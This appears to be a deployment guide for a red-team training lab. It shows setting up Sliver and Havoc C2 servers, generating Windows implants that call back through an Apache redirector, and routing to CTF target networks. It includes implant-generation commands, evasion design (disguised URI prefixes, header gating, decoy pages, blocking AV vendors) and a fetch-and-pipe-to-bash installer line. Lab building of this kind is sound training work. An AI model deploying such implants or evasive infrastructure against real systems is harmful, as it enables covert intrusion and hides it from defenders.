For full documentation, refer to the [Sliver wiki](https://github.com/BishopFox/sliver/wiki).

### Step 5.1: Access Sliver Server

Two ways to get a shell on Sliver (pick one):

| Method | How |
| ------ | --- |
| Via Guacamole | Click **"Sliver C2 Server (SSH)"** in the Guacamole portal |
| From Windows workstation | Open MobaXterm → **redStack Lab** → **Sliver C2 Server (SSH)** |

> [!NOTE]
> For a CLI-only experience from your host machine, SSH into the Guacamole instance using your AWS key (it has a public Elastic IP) and use it as a jumpbox:
> `ssh -i rs-rsa-key.pem -J admin@<GUAC_PUBLIC_IP> admin@sliver`
> Get the Guacamole IP from `terraform output deployment_info`.

### Step 5.2: Connect to Sliver and Create Listener

The Sliver daemon runs automatically as a systemd service on boot. Connect to it using the Sliver client:

```bash
sliver-client
```

**On first login only:** import the pre-built C2 profile. This only needs to be done once per deployment since Sliver stores it in its database:

```text
sliver > c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
```

> [!NOTE]
> The `redstack` C2 profile is pre-generated at boot with the correct `X-Request-ID` token from your Terraform configuration. Import it once per deployment; Sliver stores it in its database so this step is not needed again after a reconnect.

**Start the HTTP listener:**

```text
sliver > http --lhost 0.0.0.0 --lport 80
```

This starts a plain HTTP listener on port 80. The implant connects over HTTPS to the redirector, which terminates SSL and forwards plain HTTP internally to Sliver on port 80.

> [!WARNING]
> SSL is handled entirely by the Apache redirector. Sliver never sees TLS. The redirector proxies to Sliver on port 80 (plain HTTP) internally. The implant's callback URL is still `https://yourdomain/...` so from the target's perspective all traffic is encrypted. If your redirector and team servers are not co-located or connected via private VPC peering, consider tunneling internal C2 traffic over SSH to protect it in transit. Plain HTTP between the redirector and Sliver could be intercepted if routed over untrusted infrastructure.

**Checkpoint:** ✅ Sliver HTTP listener running on port 80

### Step 5.3: Generate Implant

Generate the implant using the `redstack` C2 profile:

```text
sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
```

Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`, or the redirector's public IP for closed/IP-only environments (`https://<REDIR_PUBLIC_IP>/cloud/storage/objects/`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.

**Transfer the implant to the Windows workstation:**

> [!TIP]
> Run the SCP command from PowerShell on the Windows workstation. The `sliver` hostname resolves automatically via the hosts file, so no IP is needed. This does not interrupt your active Sliver console session.

```powershell
scp admin@sliver:/tmp/implant.exe C:\Users\Administrator\Desktop\implant.exe
```

Authenticate with the lab SSH password when prompted.

Execute the implant on the Windows workstation. You should see a new session appear in the Sliver console.

**Checkpoint:** ✅ Sliver implant calling back through redirector

### Step 5.4: Test Sliver Session

```text
sliver > sessions
```

> [!TIP]
> Use `sessions -i [SESSION_ID]` to list and interact with a session in one command instead of two steps.

```text
sliver > use [SESSION_ID]

sliver (SESSION) > whoami
sliver (SESSION) > pwd
```

**Verify Redirector Traffic (on redirector via SSH):**

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

**Checkpoint:** ✅ Sliver C2 operational through redirector URI prefix /cloud/storage/objects/

---

## Part 6: Havoc C2 Setup

> [!IMPORTANT]
> Havoc is a modern open-source C2 framework developed by Paul Ungur (5pider) with a focus on evasion and advanced post-exploitation. It features a Qt-based GUI client (the "Katana" client) that connects to a remote teamserver, similar in model to Cobalt Strike. Havoc's agents ("Demons") are written in C and include features like indirect syscalls and sleep obfuscation, making it a popular choice for practicing modern evasion techniques.
>
> **Access model:** The Havoc client GUI runs directly on the Havoc server inside an XFCE4 desktop. Operators access it through Guacamole via VNC with no local client install required.

### Objective: Havoc Proof-of-Function

Same goal: get a Windows `.exe` demon calling back through the redirector to confirm Havoc is working. Not a Havoc tutorial.

For full documentation, refer to the [Havoc Framework docs](https://havocframework.com/docs).

### Step 6.1: Build Havoc (run once after deployment)

Unlike other C2 servers in the lab, Havoc is **not pre-built**. The Go compiler, Havoc source, and Qt5 client are compiled on first use. SSH and VNC are available shortly after boot; the build runs as a manual step.

**Via Guacamole:** Click **"Havoc C2 Server (SSH)"**, then run:

```bash
~/build_havoc.sh
```

The script logs everything to `~/havoc_build.log` and takes **15–25 minutes** to complete. It is safe to re-run if anything fails.

When complete you will see:

```text
===== Havoc Build Complete ...
```

**Checkpoint:** ✅ Build script finished with no errors

### Step 6.2: Verify Havoc Teamserver

The build script starts the teamserver automatically. Confirm it is running:

```bash
sudo systemctl status havoc
```

The teamserver runs on port 40056 with the profile at `/opt/Havoc/profiles/default.yaotl`.

**Operator Credentials** (same lab password as all other machines; see `terraform output deployment_info`):

- Username: `operator`
- Password: `<lab-password>`

> [!CAUTION]
> If the teamserver starts and immediately crashes, a stale database from a previous deployment may be the cause. Delete it and restart:
>
> ```bash
> rm /opt/Havoc/teamserver/data/teamserver.db
> sudo systemctl restart havoc
> ```

**Checkpoint:** ✅ Havoc teamserver running on port 40056

### Step 6.3: Open the Havoc Desktop and Connect the Client

**Via Guacamole:** Click **"Havoc C2 Desktop (VNC)"**

> [!NOTE]
> Havoc has two separate Guacamole connections. The **SSH** connection gives terminal-only access for checking service status and logs. The **VNC** connection opens the full XFCE4 desktop where the GUI client runs. The Havoc client can only be used from the VNC session.

An XFCE4 desktop loads. The Havoc GUI client launches automatically. When the login dialog appears, enter:

- **Host:** `localhost`
- **Port:** `40056`
- **Username:** `operator`
- **Password:** `<lab-password>`

If the client does not autostart, open a terminal on the desktop and run:

```bash
havoc-client client
```

**Checkpoint:** ✅ Havoc client connected to teamserver

### Step 6.4: Create Listener and Generate Demon

> [!IMPORTANT]
> Retrieve your `X-Request-ID` token before creating the listener. It is required for the **Headers** field and gets baked into the demon at generation time. Run this on your local machine:
>
> ```bash
> terraform output deployment_info
> # Look for: C2 Header: X-Request-ID: <token>
> ```

**Create the listener in the Havoc client:**

1. Navigate to: **View → Listeners → Add**
2. Configure the following fields:

| Field | Value |
| ----- | ----- |
| Payload | Http |
| **Hosts** | `yourdomain.tld` (domain) or `<REDIR_PUBLIC_IP>` (IP-only/closed env), then click **Add** |
| Host (Bind) | `0.0.0.0` |
| PortBind | `80` |
| **PortConn** | `80` |
| **Uris** | `/edge/cache/assets/update`, then click **Add** (add more if desired, all must start with `/edge/cache/assets/`) |
| **Headers** | `X-Request-ID: <token>`, then click **Add** (no quotes around token) |

> The **Hosts** field is the callback address baked into the demon. The **Uris** and **Headers** are embedded in the demon so it sends them on every check-in. The redirector validates the URI prefix and header, then forwards the full path (prefix intact) as plain HTTP to Havoc on port 80.

1. Click **Save**

**Generate a Demon (Havoc implant):**

> [!CAUTION]
> The **Spawn64** and **Spawn32** fields in the Injection section are required. Leaving either blank causes a silent build error. Always fill both in before clicking Generate.

1. Navigate to: **Attack → Payloads**
2. Select the listener you just created, set Arch **x64**, Format **Windows Exe**
3. Fill in the **Injection** section:
   - **Spawn64:** `C:\Windows\System32\notepad.exe`
   - **Spawn32:** `C:\Windows\SysWOW64\notepad.exe`
4. Click **Generate**. The `.exe` is saved to `/home/admin/Desktop/demon.x64.exe`

**Transfer the demon to the Windows workstation:**

From the Windows machine (via Guacamole RDP or MobaXterm), pull the file from the Havoc server:

```powershell
scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\
```

**Checkpoint:** ✅ Havoc Demon calling back through redirector URI prefix /edge/cache/assets/

---

## Part 7: Final Validation

### Objective: Complete Infrastructure Validation

Verify complete infrastructure and security posture.

### Step 7.1: Test Security Isolation

**Critical Test - C2 Servers Should NOT Be Directly Accessible:**

All three C2 servers (Mythic, Sliver, Havoc) have no public IPs and are unreachable from the internet by design. They can only be accessed internally via Guacamole or through the redirector's VPC peering.

**Expected:** No C2 server has a public IP. All C2 traffic must flow through the Apache redirector.

**Checkpoint:** ✅ C2 servers not directly accessible (GOOD!)

**Verify Redirector CAN Reach All C2 Servers (run on the redirector via SSH):**

```bash
# Use a browser User-Agent; curl is blocked by redirect.rules
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Test direct backend connectivity (hostnames resolve via /etc/hosts on the redirector)
curl -I -m 5 -A "$UA" http://mythic/
curl -I -m 5 -A "$UA" http://sliver/
curl -I -m 5 -A "$UA" http://havoc/
```

**Expected:** `curl: (7) Failed to connect` (no listener running yet). This is correct. Verify ping works to confirm VPC peering:

```bash
ping -c 3 mythic
```

**Checkpoint:** ✅ Redirector can ping all C2 servers via private IPs (VPC peering confirmed)

### Step 7.2: Verify All Agent Callbacks

**Check across all C2 frameworks:**

- Mythic: Active Callbacks page in the web UI
- Sliver: `sessions` command in the Sliver console
- Havoc: Active sessions in the Havoc client

**Checkpoint:** ✅ All C2 callback paths functional

### Step 7.3: Review Redirector Logs

**All C2 traffic flows through the redirector:**

```bash
# SSH to redirector
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>

# HTTPS traffic (C2 callbacks)
sudo tail -20 /var/log/apache2/redirector-ssl-access.log

# HTTP traffic
sudo tail -20 /var/log/apache2/redirector-access.log

# Differentiate by URI prefix:
# /cdn/media/stream/ = Mythic
# /cloud/storage/objects/ = Sliver
# /edge/cache/assets/ = Havoc
```

**Checkpoint:** ✅ Redirector logging understood for all C2 servers

---

## Troubleshooting

Reference this section if any component is not behaving as expected after deployment. Each subsection targets a specific failure mode with symptoms, root cause, and fix.

### Component Health Checks

Use these checks if something isn't working as expected after deployment.

#### Mythic C2 Server

SSH to Mythic via Guacamole or jump host, then:

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

**Expected:** 8 core containers + `apollo` + `http` all showing `running`. The warnings about localhost binding are expected and harmless.

**Get admin password:**

```bash
sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD
```

**Access web UI** (from Windows workstation or Guacamole RDP):

```text
https://mythic:7443
```

Login: `mythic_admin` / password from above.

#### Guacamole Server

SSH to Guacamole, then check Docker containers:

```bash
docker ps
```

**Expected:** 3 containers, all up: `guacamole/guacamole`, `postgres:15`, and `guacamole/guacd`.

#### Apache Redirector

SSH to the redirector, then run the pre-installed test script:

```bash
sudo /home/admin/test_redirector.sh
```

This checks Apache status, VirtualHost config, connectivity to all three C2 backends, and header/decoy page behavior.

**Check redirect.rules is loaded:**

```bash
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

**Test security layers manually** (must use a browser User-Agent; `curl` is blocked by redirect.rules):

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADER_VALUE="<token from terraform output deployment_info>"
TARGET="yourdomain.tld"          # or <REDIR_PUBLIC_IP> for IP-only/closed environments

# Should return DECOY PAGE (no header)
curl -sk -A "$UA" https://$TARGET/

# Should return DECOY PAGE (wrong header)
curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://$TARGET/cdn/media/stream/test

# Should proxy to Mythic (connection refused if no listener, expected)
curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://$TARGET/cdn/media/stream/test
```

**View Apache logs:**

```bash
sudo tail -50 /var/log/apache2/redirector-ssl-access.log
sudo tail -50 /var/log/apache2/redirector-ssl-error.log
```

> [!NOTE]
> AWS and Azure cloud IP blocks are **commented out by default** in redirect.rules because this lab runs in AWS. If you deploy outside cloud environments you can re-enable them:
>
> ```bash
> sudo nano /etc/apache2/redirect.rules
> # Uncomment: "Class A Exclusions", "AWS Fine Grained", "Azure", "Other VT hosts"
> sudo systemctl reload apache2
> ```

#### Sliver C2 Server

SSH to Sliver via Guacamole, then:

```bash
which sliver-server
```

If missing, see [Sliver Not Installed](#sliver-not-installed).

#### Havoc C2 Server

SSH to Havoc via Guacamole, then:

```bash
sudo systemctl status havoc
```

If not running: `sudo systemctl start havoc`. If the binary is missing, see [Havoc Build Failed](#havoc-build-failed).

#### SSH Connections via Guacamole

Each Guacamole SSH connection should connect without a password prompt and land at the correct hostname. Quick check:

1. Click **"Mythic C2 Server (SSH)"** → prompt: `admin@mythic:~$` → run `ping sliver`
2. Click **"Guacamole Server (SSH)"** → prompt: `admin@guac:~$`
3. Click **"Apache Redirector (SSH)"** → prompt: `admin@redirector:~$`
4. Click **"Sliver C2 Server (SSH)"** → prompt: `admin@sliver:~$`
5. Click **"Havoc C2 Server (SSH)"** → prompt: `admin@havoc:~$`

**SSH security model:** All Linux servers allow password auth from within the C2 VPC (10.50.0.0/16) but require SSH keys from public IPs. This lets Guacamole connect with passwords while keeping public SSH key-only.

---

### redirect.rules Download Fails

**Symptoms:** Apache fails to start, `apache2ctl -S` shows:

```text
Invalid command '404:', perhaps misspelled or defined by a module not included
```

**Root Cause:** The redirector downloads `redirect.rules` from the public [redRules repo](https://github.com/BaddKharma/redRules) at boot. If the download failed (network issue, timeout), the file may be empty or contain an error response.

**Verify:**

```bash
head -3 /etc/apache2/redirect.rules
```

**Fix: Re-download manually on the redirector:**

```bash
curl -sL "https://raw.githubusercontent.com/BaddKharma/redRules/main/redirect.rules" \
  -o /etc/apache2/redirect.rules
sudo apache2ctl configtest && sudo systemctl reload apache2
```

---

### Mythic nginx SSL Certificate Missing

**Symptoms:** `mythic_nginx` container keeps restarting. Logs show:

```text
[emerg] cannot load certificate "/etc/ssl/private/mythic-cert.crt": No such file or directory
```

**Root Cause:** Mythic's `mythic-cli start` generates SSL certificates, but the setup script was previously running it as the `admin` user which cannot write to `/etc/ssl/private/` (root-owned). This is fixed in current versions of the setup script.

**Fix: Generate the cert manually:**

```bash
sudo openssl req -x509 -newkey rsa:4096 \
  -keyout /etc/ssl/private/mythic-cert.key \
  -out /etc/ssl/private/mythic-cert.crt \
  -days 365 -nodes -subj "/CN=mythic"

cd /opt/Mythic
sudo ./mythic-cli restart
```

**Verify:**

```bash
sudo ./mythic-cli status
# mythic_nginx should now show "running (healthy)"
```

---

### Guacamole Connections Not Auto-Created

**Symptoms:** Some or all of the 7 connections don't appear in Guacamole UI after deployment

**Root Cause:** Previous versions had a bug where the setup script used incorrect database backend ('mysql' instead of 'postgresql')

**Solution:**

```bash
# SSH to Guacamole server
ssh -i rs-rsa-key.pem admin@<GUAC_PUBLIC_IP>

# Check if connections exist
docker exec -it postgres_guacamole psql -U guacamole_user -d guacamole_db \
  -c "SELECT connection_id, connection_name, protocol FROM guacamole_connection;"
```

**Expected:** Should show 7 connections (1 RDP, 5 SSH, 1 VNC)

**If Missing, Manually Create via Guacamole UI:**

1. Log into Guacamole web UI
2. Settings (top right) → Connections → New Connection

**SSH Connections (for any missing C2 server):**

- Name: `Sliver C2 Server (SSH)` or `Havoc C2 Server (SSH)`
- Protocol: SSH
- Hostname: Private IP from `terraform output deployment_info`
- Port: 22
- Username: admin
- Password: from `terraform output deployment_info`

**Fixed in Current Version:** The setup script correctly creates all 7 connections automatically

---

### Mythic Not Starting

**Symptoms:** mythic-cli status shows containers not running

**Solution:**

```bash
# Preferred: use Guacamole "Mythic C2 Server (SSH)" connection
# Or jump via redirector from your machine:
ssh -i rs-rsa-key.pem -J admin@<REDIR_PUBLIC_IP> admin@mythic

cd /opt/Mythic
sudo ./mythic-cli logs  # Check for errors
sudo ./mythic-cli restart
```

**Common Issues:**

- Docker still pulling images (wait 5 min)
- Port conflicts (check: `sudo netstat -tlnp`)
- Memory issues (upgrade to t3.large)
- Missing SSL cert. See [Mythic nginx SSL Certificate Missing](#mythic-nginx-ssl-certificate-missing)

---

### Sliver Not Installed

**Symptoms:** `sliver-server` command not found

**Solution:**

```bash
# Check user-data log
sudo cat /var/log/user-data.log

# Re-run installation
curl https://sliver.sh/install | sudo bash
```

---

### Havoc Build Failed

**Symptoms:** Havoc teamserver binary not found or service fails to start

**Solution:**

```bash
# Check user-data log
sudo cat /var/log/user-data.log

# Check Go installation
/usr/local/go/bin/go version

# Rebuild manually
cd /opt/Havoc/teamserver
sudo -E /usr/local/go/bin/go build -o teamserver .

# Start manually to see errors
./teamserver server --profile /opt/Havoc/profiles/default.yaotl
```

---

### Guacamole RDP Fails

**Symptoms:** Can't connect to Windows via Guacamole

**Solution:**

```bash
# Check Guacamole logs
ssh -i rs-rsa-key.pem admin@<GUAC_PUBLIC_IP>
docker logs guacamole

# Test RDP connectivity (run from Guacamole server, hostname resolves via /etc/hosts)
nc -zv win-operator 3389
```

**Common Issues:**

- Windows still setting up (wait 10 min)
- Security group misconfiguration
- Guacamole didn't auto-configure connection

---

### Agent Won't Callback

**Symptoms:** Agent executes but no callback in Mythic/Sliver/Havoc

**Checklist:**

- [ ] Listener is running on the C2 server
- [ ] Callback Host and Port match the redirector's domain/IP and port 443
- [ ] Agent sends the correct `X-Request-ID` header with the auto-generated token
- [ ] Agent URI uses the correct prefix (`/cdn/media/stream/`, `/cloud/storage/objects/`, or `/edge/cache/assets/`)
- [ ] Redirector Apache is running with all VirtualHosts enabled
- [ ] Redirector can reach the C2 server's private IP (test with ping)
- [ ] Agent user-agent is not blocked by redirect.rules (check for known scanner/AV strings)

**Debug (on redirector via SSH):**

```bash
sudo apache2ctl -S
systemctl status apache2

# Check logs (differentiate by URI prefix)
sudo tail -100 /var/log/apache2/redirector-ssl-access.log
sudo tail -100 /var/log/apache2/redirector-ssl-error.log

# Run the pre-installed test script
sudo /home/admin/test_redirector.sh
```

---

### Terraform Errors

**Error:** `InvalidKeyPair.NotFound`

```bash
# List available keys
aws ec2 describe-key-pairs --query 'KeyPairs[].KeyName'
# Update terraform.tfvars with correct name
```

**Error:** `VPC limit exceeded`

```bash
# Use default VPC instead
# In terraform.tfvars: use_default_vpc = true
```

---

## Post-Deployment Actions

### Cleanup (When Done)

```bash
terraform destroy
# Type 'yes' to confirm

# Verify removal
aws ec2 describe-instances --filters "Name=tag:Project,Values=redstack"
```

### Cost Management

**Stop instances when not in use via AWS Console:**

1. AWS Console → EC2 → Instances
2. Select all redStack instances
3. Instance State → Stop

**Or via AWS CLI** (get instance IDs from AWS Console or `aws ec2 describe-instances`):

```bash
aws ec2 stop-instances --instance-ids i-xxxxx i-yyyyy i-zzzzz
```

---

## Success Criteria

At the end of this deployment, you should have:

- ✅ All 6 EC2 instances running and accessible
- ✅ 2 VPCs with peering configured
- ✅ Apache redirector with header validation, URI routing, and redirect.rules
- ✅ Mythic C2 server isolated (no public IP, internal only)
- ✅ Sliver C2 server isolated (no public IP, internal only)
- ✅ Havoc C2 server isolated (no public IP, internal only)
- ✅ Mythic HTTP listener configured through redirector (/cdn/media/stream/)
- ✅ Sliver HTTP listener configured through redirector (/cloud/storage/objects/)
- ✅ Havoc HTTP listener configured through redirector (/edge/cache/assets/)
- ✅ Header validation (X-Request-ID) filtering unauthorized requests
- ✅ redirect.rules blocking AV vendors and TOR exits (403); cloud IPs commented out for AWS compatibility
- ✅ Decoy page served for requests without valid C2 header
- ✅ At least 1 active agent callback per C2 framework
- ✅ Can execute commands through all C2 paths
- ✅ All 7 Guacamole connections auto-created (1 RDP, 5 SSH, 1 VNC)
- ✅ Guacamole providing web-based access to all infrastructure components
- ✅ SSH password authentication working from C2 VPC, keys required from public IPs
- ✅ Windows workstation with Chromium, VS Code, MobaXterm, and 7-Zip installed
- ✅ Windows Administrator accessible via Guacamole (AWS-generated password auto-configured)

**Your Boot-to-Breach lab environment is operational.**

---

## External Target Environments (HTB/VL/PG)

> [!NOTE]
> **This section is for External VPN Environments (ExtVPN) only.** The default redStack deployment uses a public domain, trusted TLS certificate, and htaccess filtering. Only follow this section if you are connecting to an isolated platform (HTB Pro Labs, THM, Proving Grounds) via OpenVPN where targets cannot reach the public internet.

### Objective: Connect Lab to External VPN Platforms

Route traffic from your internal lab machines (Windows workstation, C2 servers) to external target environments like HackTheBox (HTB), VulnLabs (VL), or Proving Grounds (PG) through the Apache redirector's OpenVPN tunnel.

### How It Works

```text
+----------------------------------------------------------------------+
|             EXTERNAL VPN ROUTING ARCHITECTURE                        |
+----------------------------------------------------------------------+

+--------------------------------------------------+
|  TeamServer VPC (172.31.0.0/16)                  |
|                                                  |
|  [mythic]  [sliver]  [havoc]  [WIN-OPERATOR]     |
|       \        |        /          /             |
|        +-------+---------+--------+              |
|                |                                 |
|   (1) VPC route table -- ExtVPN CIDRs:           |
|       10.10.0.0/16  }                            |
|       10.13.0.0/16  } -> guacamole ENI           |
|       10.129.0.0/16 }   (same VPC, no drop)      |
|                |                                 |
|                v                                 |
|   +------------------------------------------+   |
|   | guacamole (172.31.x.x)                   |   |
|   | wg0: 10.100.0.2/30                       |   |
|   | (2) MASQUERADE on wg0                    |   |
|   |     src -> 10.100.0.2                    |   |
|   +------------------------------------------+   |
+-------------------------|------------------------+
                          |
                          | (2) WireGuard UDP :51820
                          |     travels via VPC peering
                          |     frames dst: 10.60.x.x  <- passes peering
                          |     ExtVPN target IP is payload, not dst <- not dropped
                          |
+-------------------------|------------------------+
|  Redirector VPC (10.60.0.0/16)                   |
|                         v                        |
|   +------------------------------------------+   |
|   | redirector (10.60.x.x) Elastic IP: <Public IP> |   |
|   | wg0: 10.100.0.1/30 (server, UDP :51820)  |   |
|   | (3) decapsulate / FORWARD wg0 -> tun0    |   |
|   | (4) MASQUERADE on tun0 (src -> tun0 IP)  |   |
|   | tun0: <dynamic>                          |   |
|   +------------------------------------------+   |
+-------------------------|------------------------+
                          |
                          | (5) OpenVPN UDP (ext-vpn service)
                          |     outbound from redirector Elastic IP
                          |
+- - - - - - - - - - - -  | - - - - - - - - - - - -+
:         PUBLIC INTERNET / AWS CLOUD              :
:                         |                        :
:    OpenVPN tunnel (encrypted UDP)                :
:    Elastic IP -> HTB/VL/PG VPN endpoint          :
:                         |                        :
+- - - - - - - - - - - -  | - - - - - - - - - - - -+
                          |
                          v
             [HTB / VL / PG VPN Server]
              assigns tun0 IP, routes into
              lab network
                          |
                          v
             [ExtVPN Target Networks]
              10.10.0.0/16
              10.13.0.0/16
              10.129.0.0/16

Double NAT:
  teamserver src IP
    -> 10.100.0.2   (guacamole MASQUERADE on wg0)
    -> tun0 IP      (redirector MASQUERADE on tun0)
  ExtVPN target replies to tun0 IP; conntrack reverses both NATs on the way back.

Why VPC peering alone cannot do this:
  AWS VPC peering only delivers packets whose dst falls inside either
  VPC's CIDR (172.31.0.0/16 or 10.60.0.0/16). Packets to 10.13.38.33
  are silently dropped at the fabric; route tables, SGs, and
  source_dest_check=false make no difference.
  WireGuard frames are addressed to 10.60.x.x (redirector VPC IP),
  so they pass peering cleanly. The ExtVPN target IP rides inside the payload.
```

### Why WireGuard?

AWS VPC peering has a hard constraint: it will only deliver packets whose destination IP falls within one of the two peered VPC CIDR blocks. Attempting to route ExtVPN target traffic (e.g. `10.13.38.33`) via a peering connection causes it to be silently dropped at the AWS fabric level. Correct route tables, security groups, and `source_dest_check=false` make no difference.

WireGuard solves this by creating a Layer 3 encrypted tunnel directly between Guacamole (in the default VPC) and the redirector (in the redirector VPC). Guacamole receives CTF-bound packets from the teamservers via normal same-VPC routing, encapsulates them in WireGuard UDP frames, and sends those frames to the redirector over VPC peering. Because the WireGuard UDP frames are addressed to the redirector's VPC IP (`10.60.x.x`), not to the ExtVPN target, they pass through VPC peering cleanly. The redirector decapsulates the packets and forwards them out `tun0` to the OpenVPN server.

The result is a double-NAT path: Guacamole MASQUERADEs onto `wg0` (source becomes `10.100.0.2`), and the redirector's `ext-vpn` up-script MASQUERADEs onto `tun0` (source becomes the VPN-assigned IP). ExtVPN targets see traffic from the redirector's `tun0` IP and reply normally.

**WireGuard configuration is fully automatic.** Guacamole generates both keypairs at boot, writes its own config, then SSHes into the redirector to push the server config and start the service. No pre-deployment key generation is required.

### Step 8.1: Configure terraform.tfvars

Edit `terraform.tfvars` and set:

```hcl
enable_external_vpn                  = true   # installs OpenVPN + WireGuard, enables routing
enable_redirector_htaccess_filtering = false  # disables scanner/AV blocking (not needed in lab)
```

This enables the following at deploy time:

- Installs OpenVPN client on the redirector (`ext-vpn` systemd service)
- Installs WireGuard on both instances (redirector at boot, Guacamole configures both via SSH)
- Enables IP forwarding on both the redirector and Guacamole
- Disables AWS `source_dest_check` on both ENIs (required for packet forwarding)
- Routes CTF target CIDRs in the default VPC to Guacamole's ENI (bypasses VPC peering restriction)

**Custom Target CIDRs (optional):**

The default routed CIDRs cover the most common HTB/VL/PG ranges. Adjust if your platform uses different subnets (check `ip route` on `tun0` after connecting):

```hcl
external_vpn_cidrs = ["10.10.0.0/16", "10.13.0.0/16", "10.129.0.0/16"]
```

> [!NOTE]
> If you already deployed without `enable_external_vpn = true`, a full `terraform destroy` followed by a fresh `terraform apply` is required. The WireGuard setup runs as part of cloud-init at first boot. It cannot be triggered on a running instance by re-applying Terraform.

### Step 8.2: Deploy and Obtain Your .ovpn File

1. Deploy the infrastructure with `terraform apply`
2. Wait for cloud-init to complete on all instances (~5 minutes). Guacamole will automatically configure the WireGuard tunnel with the redirector during this time.
3. Download your `.ovpn` file from your CTF platform (HTB, THM, or Proving Grounds)

### Step 8.3: Get the .ovpn File to the Redirector

Drop any `.ovpn` file into `~/vpn/` on the redirector. The service picks up whichever file is there. Two ways to do it:

#### Option A: Guacamole sidebar upload (browser only)

1. In Guacamole, open the **"Apache Redirector (SSH)"** connection
2. Press `Ctrl+Alt+Shift` to open the sidebar
3. Click **Devices** and upload your `.ovpn` file. It will land in `~`
4. Move it into the vpn directory:

```bash
mv ~/*.ovpn ~/vpn/
```

#### Option B: SCP from WIN-OPERATOR (MobaXterm or PowerShell)

```bash
scp lab.ovpn admin@<REDIR_PRIVATE_IP>:~/vpn/
```

> [!TIP]
> MobaXterm (pre-installed on WIN-OPERATOR) has a built-in SFTP browser. Open a session to the redirector's private IP, navigate to `~/vpn/`, and drop your `.ovpn` file there.

### Step 8.4: Start the VPN Tunnel

**SSH to the redirector** from WIN-OPERATOR using the private IP:

```bash
ssh admin@<REDIR_PRIVATE_IP>
```

**Start the VPN service:**

```bash
sudo systemctl start ext-vpn
```

The `ext-vpn` service runs openvpn in the foreground under systemd. No screen or tmux needed. It persists as long as the redirector instance is running, and stops cleanly with `systemctl stop`.

**Stop the VPN:**

```bash
sudo systemctl stop ext-vpn
```

**Check VPN status and logs:**

```bash
sudo systemctl status ext-vpn
journalctl -u ext-vpn -f
```

The service uses `--pull-filter ignore "redirect-gateway"` (critical: prevents the VPN from hijacking the redirector's default route, which would break all VPC peering and C2 proxy connectivity). iptables MASQUERADE rules are applied automatically when `tun0` comes up and removed when it goes down.

> [!NOTE]
> The `ext-vpn` service will fail to start if no `.ovpn` file exists in `~/vpn/`. If multiple files are present, it picks the first one alphabetically.

### Step 8.4b: Get the VPN Interface IP for C2 Callbacks

The OpenVPN server assigns a dynamic IP to the `tun0` interface at connect time. In a closed environment where target machines can only reach IPs on the VPN network (not the public internet), this `tun0` IP is what you use as the C2 callback address.

**Get the VPN IP:**

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+)+'
```

> [!NOTE]
> This IP is only known after the VPN connects. Generate your C2 agents **after** running `sudo systemctl start ext-vpn`. Not before. The IP changes each time you reconnect.

**Use HTTP (port 80) for VPN-based callbacks.** The self-signed certificate on the redirector only has the public Elastic IP as a Subject Alternative Name, not the `tun0` IP. Using HTTP avoids certificate issues entirely. Traffic between the target and the redirector travels inside the encrypted OpenVPN tunnel, so it is already protected in transit.

**Callback addresses by C2 framework:**

| Framework | Callback Address |
| --------- | ---------------- |
| Mythic | `callback_host = "http://<tun0-ip>"`, `callback_port = 80` |
| Sliver | `--http http://<tun0-ip>/cloud/storage/objects/` |
| Havoc | Hosts: `<tun0-ip>`, PortConn: `80` (HTTP, already the default in the listener config) |

All other settings (URI prefix, `X-Request-ID` header) remain the same.

> [!NOTE]
> Apache is already listening on `0.0.0.0:80` and `0.0.0.0:443` across all interfaces. The VirtualHost configs use `<VirtualHost *:80>` and `<VirtualHost *:443>`, and UFW allows ports 80/443 on all interfaces. When tun0 comes up after `vpn.sh start`, Apache automatically handles traffic arriving on that IP with no reload or restart required. Header validation and URI routing apply to all requests regardless of which interface they arrive on.
>
> If the target machine has outbound internet access (most HTB standalone boxes and many Pro Lab machines do), you can use the public Elastic IP with HTTPS (`https://<REDIR_PUBLIC_IP>/prefix/`) instead. The tun0 IP is only needed when targets are fully isolated from the internet and can only reach the VPN network.

### Step 8.5: Verify Connectivity from Internal Machines

**From the Windows operator workstation (via Guacamole RDP):**

```powershell
# Ping a target on the CTF network
ping 10.10.10.2

# Or run nmap, etc.
nmap -sC -sV 10.10.10.2
```

**From any C2 server (via Guacamole SSH):**

```bash
ping 10.10.10.2
```

Traffic from any internal machine destined for the CTF target CIDRs is automatically routed through the redirector's VPN tunnel.

### Step 8.6: Stop the VPN

```bash
sudo systemctl stop ext-vpn
```

This stops the OpenVPN process and removes the iptables MASQUERADE rules on `tun0`. The `.ovpn` file is preserved in `~/vpn/` so you can restart without re-uploading. The WireGuard tunnel (`wg-quick@wg0`) stays up and will reconnect automatically when `ext-vpn` restarts.

### Important Notes

- **WireGuard is automatic.** Keys are generated on Guacamole at first boot. Guacamole then SSHes into the redirector to push the server config and start `wg-quick@wg0` on both ends. No pre-deployment key setup is needed.
- **The VPN does NOT affect C2 operations.** The `--pull-filter ignore "redirect-gateway"` flag ensures only CTF target traffic goes through the tunnel. All VPC peering, Apache proxy, and C2 callback traffic continues to work normally.
- **Only the configured CIDRs are routed.** Traffic to other destinations (internet, VPC peers) is unaffected. Add CIDRs to `external_vpn_cidrs` in `terraform.tfvars` if your platform uses different subnets.
- **The .ovpn file persists across reboots** in `~/vpn/`. The VPN tunnel itself does not auto-start. Run `sudo systemctl start ext-vpn` after a reboot. The WireGuard tunnel (`wg-quick@wg0`) is enabled at boot on both instances and comes up automatically.
